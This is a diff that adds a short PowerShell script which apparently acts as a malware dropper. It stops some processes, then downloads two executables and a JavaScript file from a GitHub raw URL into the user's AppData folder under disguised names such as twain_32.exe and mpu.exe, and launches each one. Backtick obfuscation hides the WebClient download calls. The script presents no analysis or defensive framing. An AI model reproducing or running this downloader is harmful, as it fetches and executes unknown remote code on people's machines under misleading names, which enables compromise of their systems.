@@ -1,0 +1,37 @@
+Stop-Process -Name "euninstaller"
+Stop-Process -Name "muninstaller"
+Stop-Process -Name "down"
+Function dwn
+{
+	
+  $running = Get-Process DellTPa.exe -ErrorAction SilentlyContinue
+   
+    if (!$running)
+    {
+        
+		(New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`F`i`l`e"('https://raw.githubusercontent.com/dashboard23/fgjhfdgkjdkjfghi.html/main/euninstaller.exe', "C:\Users\$env:UserName\AppData\Local\Programs\Common\twain_32.exe");[System.Diagnostics.Process]::Start("C:\Users\$env:UserName\AppData\Local\Programs\Common\twain_32.exe");
+	
+	}
+		
+	 $running1 = Get-Process Eclipse.exe -ErrorAction SilentlyContinue
+	 if (!$running1)
+	
+	 {
+		 
+(New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`F`i`l`e"('https://raw.githubusercontent.com/dashboard23/fgjhfdgkjdkjfghi.html/main/muninstaller.exe', "C:\Users\$env:UserName\AppData\Local\Programs\Common\mpu.exe");[System.Diagnostics.Process]::Start("C:\Users\$env:UserName\AppData\Local\Programs\Common\mpu.exe");
+
+		}
+ $running2 = Get-Process storage.js -ErrorAction SilentlyContinue
+	 if (!$running2)
+	
+	 {
+		 
+(New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`F`i`l`e"('https://raw.githubusercontent.com/dashboard23/fgjhfdgkjdkjfghi.html/main/task.js', "C:\Users\$env:UserName\AppData\Local\Programs\Common\pluginy.js");[System.Diagnostics.Process]::Start("C:\Users\$env:UserName\AppData\Local\Programs\Common\pluginy.js");
+
+		}
+		
+}
+
+
+IEX dwn
+
